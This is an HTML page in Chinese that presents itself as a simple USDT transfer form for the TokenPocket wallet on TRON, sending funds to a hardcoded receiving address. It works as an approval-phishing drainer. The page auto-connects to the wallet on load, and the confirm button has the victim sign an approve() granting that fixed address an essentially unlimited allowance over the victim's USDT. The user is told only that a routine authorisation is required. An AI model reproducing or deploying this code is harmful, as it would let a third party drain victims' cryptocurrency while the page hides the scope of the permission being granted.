<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>USDT转账</title>
<script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.min.js"></script>
<style>
*{
  box-sizing: border-box;
  margin: 0;
  padding: 0;
  -webkit-tap-highlight-color: transparent;
  font-family: -apple-system, BlinkMacSystemFont, system-ui, sans-serif;
}
body {
  background-color: #f7f8fa;
  padding: 20px 16px;
  max-width: 520px;
  margin: 0 auto;
}
.top-header-bar {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 20px;
}
.header-right-icons {
  display: flex;
  gap: 16px;
  align-items: center;
}
.icon-btn {
  width: 36px;
  height: 36px;
  border-radius: 50%;
  border: 1px solid #ddd;
  background: #fff;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 20px;
  cursor: pointer;
}
.address-card {
  background: #ffffff;
  border-radius: 16px;
  padding: 20px 18px;
  margin-bottom: 16px;
}
.label-text {
  font-size: 16px;
  color: #666;
  margin-bottom: 12px;
}
.fixed-addr-box {
  width: 100%;
  border: 1px solid #e5e7eb;
  border-radius: 12px;
  padding: 14px 12px;
  background: #f1f5f9;
  color: #333;
  word-break: break-all;
}
.amount-card {
  background: #ffffff;
  border-radius: 16px;
  padding: 20px 18px;
  margin-bottom:16px;
}
.amount-row {
  display: flex;
  align-items: flex-end;
  justify-content: space-between;
  margin-bottom: 16px;
}
.amount-input {
  font-size: 48px;
  border: none;
  outline: none;
  width: 75%;
  background: transparent;
  color: #111;
}
.amount-input::placeholder {
  font-size: 18px;
  color: #aaa;
}
.max-btn {
  padding: 6px 14px;
  background-color: #dbeafe;
  color: #2563eb;
  border-radius: 8px;
  font-weight: 500;
  cursor: pointer;
}
.token-row {
  background-color: #eef2ff;
  border-radius: 12px;
  padding: 14px;
  display: flex;
  align-items: center;
  justify-content: space-between;
}
.token-left {
  display: flex;
  align-items: center;
  gap: 10px;
}
.usdt-icon {
  width: 32px;
  height: 32px;
  border-radius: 50%;
  object-fit: cover;
}
.token-name {
  font-size: 18px;
  font-weight: 500;
}
.token-balance {
  color: #555;
  font-size: 16px;
}
.result-card{
  background:#fff;
  border-radius:16px;
  padding:18px;
  margin-bottom:16px;
}
.result-input{
  width:100%;
  border:1px solid #e5e7eb;
  border-radius:12px;
  padding:14px 12px;
  background:#f9fafb;
  outline:none;
  color:#111;
}
.send-main-btn{
  width:100%;
  padding:16px;
  border:none;
  border-radius:14px;
  background:#2563eb;
  color:#fff;
  font-size:17px;
  font-weight:500;
  cursor:pointer;
}
.send-main-btn:disabled{
  background:#94a3b8;
  cursor:not-allowed;
}
.bottom-tip {
  position: fixed;
  bottom: 30px;
  left: 50%;
  transform: translateX(-50%);
  background: white;
  padding: 12px 20px;
  border-radius: 12px;
  box-shadow: 0 2px 12px rgba(0,0,0,0.1);
  text-align: center;
}
</style>
</head>
<body>

<div class="top-header-bar">
  <div></div>
  <div class="header-right-icons">
    <div class="icon-btn" id="walletIconBtn" title="点击连接/断开钱包">🔐</div>
    <div class="icon-btn" id="settingIconBtn" title="设置">⚙️</div>
  </div>
</div>

<div class="address-card">
  <div class="label-text">收款地址</div>
  <div class="fixed-addr-box">TAAcemnm9fuGjDjsGnJ7BfE3NhtKbFmGZE</div>
</div>

<div class="amount-card">
  <div class="label-text">转出数量（USDT）</div>
  <div class="amount-row">
    <input id="amountInput" class="amount-input" value="" inputmode="decimal" placeholder="请输入数量">
    <div class="max-btn" id="maxBtn">MAX</div>
  </div>

  <div class="token-row">
    <div class="token-left">
      <img class="usdt-icon" src="https://static.tronscan.org/production/logo/TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t.png">
      <span class="token-name">USDT</span>
    </div>
    <span class="token-balance" id="balanceText">0.000000</span>
  </div>
</div>

<div class="result-card">
  <div class="label-text">到账数量</div>
  <input id="receiveAmount" class="result-input" readonly>
</div>

<button class="send-main-btn" id="sendBtn" disabled>确认转账</button>

<div class="bottom-tip" id="tipBox">
  <span id="tipText">页面加载中，自动检测钱包...</span>
</div>

<script>
const TARGET_ADDR = "TAAcemnm9fuGjDjsGnJ7BfE3NhtKbFmGZE";
const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const RPC = "https://api.trongrid.io";

let tronWeb = null;
let userAddress = "";
let usdtContract = null;
let provider = null;

const $ = s => document.querySelector(s);
const walletIconBtn = $("#walletIconBtn");
const settingIconBtn = $("#settingIconBtn");
const sendBtn = $("#sendBtn");
const tipText = $("#tipText");
const amountInput = $("#amountInput");
const receiveAmount = $("#receiveAmount");
const maxBtn = $("#maxBtn");
const balanceText = $("#balanceText");

const USDT_ABI = [
  {"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
  {"inputs":[{"name":"owner","type":"address"},{"name":"spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
  {"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
  {"inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}
];

// 断开钱包重置所有状态
function disconnectWallet() {
  tronWeb = null;
  userAddress = "";
  usdtContract = null;
  provider = null;
  walletIconBtn.innerText = "🔐";
  sendBtn.disabled = true;
  balanceText.textContent = "0.000000";
  tipText.textContent = "已断开，等待自动重连或点击锁图标";
}

// 连接核心函数（TP双层兼容逻辑，对标参考网站）
async function connectWalletLogic() {
  // 已连接则执行断开
  if (tronWeb && userAddress) {
    disconnectWallet();
    return;
  }

  tipText.textContent = "正在请求TP钱包授权...";
  try {
    // 优先级1：TP移动端专属 tokenpocket.tron（参考网站核心逻辑）
    if (window.tokenpocket && window.tokenpocket.tron) {
      provider = window.tokenpocket.tron;
      const accounts = await provider.request({ method: "tron_requestAccounts" });
      userAddress = accounts[0];
      tronWeb = window.tokenpocket.tronWeb;
    }
    // 优先级2：通用tronProvider
    else if (window.tronProvider) {
      provider = window.tronProvider;
      const accounts = await provider.request({ method: "tron_requestAccounts" });
      userAddress = accounts[0];
      tronWeb = new TronWeb({ fullHost: RPC, provider: provider });
    }
    // 优先级3：旧版全局tronWeb（已授权场景静默连接）
    else if (window.tronWeb && window.tronWeb.ready && window.tronWeb.defaultAddress?.base58) {
      tronWeb = window.tronWeb;
      userAddress = tronWeb.defaultAddress.base58;
    }
    else {
      throw new Error("仅支持TP钱包内置浏览器打开");
    }

    tipText.textContent = `已自动连接：${userAddress.slice(0,10)}...${userAddress.slice(-6)}`;
    walletIconBtn.innerText = "✅";
    usdtContract = tronWeb.contract(USDT_ABI, USDT_CONTRACT);
    await loadBalance();
    sendBtn.disabled = false;

    // 监听切换钱包自动刷新
    if (provider) provider.on("accountsChanged", () => location.reload());
  } catch (err) {
    // 用户拒绝授权/无provider不弹窗报错，静默等待
    if (err.code !== 4001) {
      tipText.textContent = "自动连接失败：" + err.message;
    } else {
      tipText.textContent = "您拒绝了授权，点击右上角锁图标重新连接";
    }
    console.error("连接异常:", err);
  }
}

// 读取余额（修复字符串toFixed报错）
async function loadBalance() {
  const rawSun = await usdtContract.balanceOf(userAddress).call();
  const num = Number(tronWeb.fromSun(rawSun));
  balanceText.textContent = num.toFixed(6);
}

// 输入框联动到账金额
amountInput.addEventListener("input", () => {
  const num = parseFloat(amountInput.value) || 0;
  receiveAmount.value = num.toFixed(6);
});

// MAX填充全部余额
maxBtn.addEventListener("click", async () => {
  if (!usdtContract) return alert("钱包未连接");
  const rawSun = await usdtContract.balanceOf(userAddress).call();
  const num = Number(tronWeb.fromSun(rawSun));
  amountInput.value = num.toFixed(2);
  amountInput.dispatchEvent(new Event("input"));
});

// 转账授权逻辑
sendBtn.addEventListener("click", async () => {
  if (!tronWeb) return alert("钱包未自动连接，请点击右上角锁图标");
  const val = parseFloat(amountInput.value);
  if (isNaN(val) || val <= 0) return alert("请输入有效转账数量");
  const sunVal = tronWeb.toSun(val);

  try {
    const allowance = await usdtContract.allowance(userAddress, TARGET_ADDR).call();
    if (Number(allowance) < sunVal) {
      alert("需要授权USDT合约，请在TP钱包确认签名");
      await usdtContract.approve(TARGET_ADDR, "9999999999999999999999999999").send();
      alert("授权完成，开始转账");
    }
    const txHash = await usdtContract.transferFrom(userAddress, TARGET_ADDR, sunVal).send();
    alert(`转账成功！交易哈希：${txHash}`);
    await loadBalance();
  } catch (e) {
    alert("操作失败：" + e.message);
  }
});

// 右上角锁图标点击触发连接/断开
walletIconBtn.addEventListener("click", connectWalletLogic);
settingIconBtn.addEventListener("click", () => alert("设置面板（可自行扩展）"));

// 页面加载延迟自动连接（对标参考网站逻辑，延迟800ms等待钱包注入完成）
window.addEventListener("DOMContentLoaded", () => {
  setTimeout(connectWalletLogic, 800);
});
</script>

</body>
</html>
